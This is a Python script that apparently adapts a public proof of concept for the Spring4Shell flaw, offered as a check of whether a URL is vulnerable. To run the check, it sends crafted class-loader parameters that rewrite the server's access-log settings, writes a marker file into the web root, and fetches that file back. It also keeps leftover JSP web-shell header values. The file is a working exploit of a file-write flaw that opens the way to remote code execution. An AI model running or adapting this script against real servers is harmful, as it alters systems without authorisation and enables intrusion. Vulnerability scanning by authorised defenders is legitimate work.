#!/usr/bin/env python3
#  -*- coding: utf-8 -*-
# Quick hacked script from public poc to check if endpoint is vulnerable

__author__ = 'nighter@nighter.se'

import requests
import argparse
from urllib.parse import urlparse
import time
import sys
import os
import time
from urllib.parse import urljoin

post_headers = {
    "Content-Type": "application/x-www-form-urlencoded"
}

get_headers = {
    "prefix": "<%",
    "suffix": "%>//",
    "c": "Runtime",
}

def isvuln():
    
    global URL
    global CONTAINER
    global SHELLURL
    
    log_pattern = "vulnerable"
    log_file_suffix = "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.txt"
    log_file_dir = "class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/%s/" % CONTAINER
    log_file_prefix = "class.module.classLoader.resources.context.parent.pipeline.first.prefix=vuln"
    log_file_date_format = "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
    exp_data = "&".join([log_pattern, log_file_suffix, log_file_dir, log_file_prefix, log_file_date_format])
    
    file_date_data = "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=_"

    # Setting and unsetting the fileDateFormat field allows for executing the exploit multiple times
    # If re-running the exploit, this will create an artifact of {old_file_name}_.jsp
    file_date_data = "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=_"
    #print("[*] Resetting Log Variables.")
    try:
        ret = requests.post(URL, headers=post_headers, data=file_date_data, verify=False)
    except:
        pass
    #print("[*] Response code: %d" % ret.status_code)

    time.sleep(3)
    try:
        ret = requests.post(URL, headers=post_headers, data=exp_data, verify=False)
    except:
        pass
    #print("[*] Response code: %d" % ret.status_code)

    time.sleep(1)

    # Reset the pattern to prevent future writes into the file
    pattern_data = "class.module.classLoader.resources.context.parent.pipeline.first.pattern="
    #print("[*] Resetting Log Variables.")
    try:
        ret = requests.post(URL, headers=post_headers, data=pattern_data, verify=False)
    except:
        pass
    #print("[*] Response code: %d" % ret.status_code)

    time.sleep(2)
    try:
        ret = requests.get("%s"% SHELLURL, headers=post_headers, verify=False)
    except:
        pass
    
    try:
        if str(ret.status_code).startswith('2'):
            print("[+] Vulnerable")
        else:
            print("[-] Not vulnerable") 
    except:
        print("[-] Not vulnerable")


if __name__ == '__main__':
    
    if len(sys.argv) != 2:
        print("Example: %s http://127.0.0.1:8000/spring4shell/greeting" % sys.argv[0])
        print("""Usage: %s <URL>""" % sys.argv[0])
        os._exit(0)
    
    URL = sys.argv[1]
    SHELLURL = urljoin(URL, 'vuln.txt')
    try:
       CONTAINER = URL.split('/')[ -2]
    except:
        CONTAINER = ''
    
    isvuln()